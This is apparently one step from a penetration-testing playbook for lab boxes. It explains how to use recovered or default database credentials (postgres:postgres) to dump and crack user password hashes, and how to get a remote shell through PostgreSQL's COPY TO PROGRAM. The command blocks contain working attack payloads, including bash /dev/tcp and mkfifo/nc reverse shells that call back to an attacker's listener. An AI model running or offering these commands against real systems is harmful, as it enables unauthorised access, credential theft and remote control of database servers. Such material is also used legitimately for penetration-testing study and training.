# Linux - Database Access

**Step 18 of 50 · Linux**

*Use a recovered database credential to inspect users, hashes, and possible password reuse.*

## Run this

```bash
# MySQL — default port 3306
mysql -h $BoxIP -u $Username -p

# PostgreSQL — default port 5432, non-standard also common (5437, 5433)
psql -h $BoxIP -p 5432 -U $Username -d $Database

# Useful queries once connected
# MySQL:  SHOW DATABASES; USE dbname; SHOW TABLES; SELECT username,password FROM users;
# Postgres: \l   \c dbname   \dt   SELECT username,password FROM users;

hashcat -m $HashMode $HashFile $Wordlist
```

PostgreSQL RCE (if superuser):

```sql
-- Read a file
COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';

-- Reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"';
-- If /bin/sh only (no bash): use mkfifo payload instead
COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LocalIP $Lport >/tmp/f';
```

## Example output

 > *Example shape only: the exact database client and query depend on the target.*

```
mysql> SELECT username,password FROM users;
username | HASH
...
```

PostgreSQL COPY TO PROGRAM:

```
postgres=# COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
COPY 1
```

## What did you get?

- [ ] A cracked hash gives SSH access → **Validate it, then continue to the Linux foothold**
- [ ] The password works on another service → **Validate it and go to Step 11 · [[Linux - RCE to Shell]] or the SSH path**
- [ ] PostgreSQL connects as a superuser → **Use `COPY TO PROGRAM` to run commands; send a reverse shell and go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] PostgreSQL listens on a non-standard port → **Try `psql -p 5437` (and common alternates 5433, 5436) — default credentials `postgres:postgres` or blank password**
- [ ] Only database data is found → **Return to Step 17 · [[Linux - Credential Search]]**
- [ ] No useful data is returned → **Go to Step 19 · [[Linux - Kernel Exploit]]**

## Notes

Use the client matching the open database service and keep the password private.

PostgreSQL `COPY TO PROGRAM` requires the `pg_execute_server_program` privilege, which superusers have by default. Connect as `postgres` with default credentials (`postgres:postgres` or blank) if no credentials are found elsewhere.

## Gotcha

> [!warning] 💡
> The exact database name, table, and hash mode depend on the target. Confirm them before running the query.

> [!warning] 💡
> PostgreSQL executes `COPY TO PROGRAM` through `/bin/sh`, not bash. The `/dev/tcp` syntax is bash-specific and will silently fail. Use the mkfifo payload or `nc -e` if the target has it.
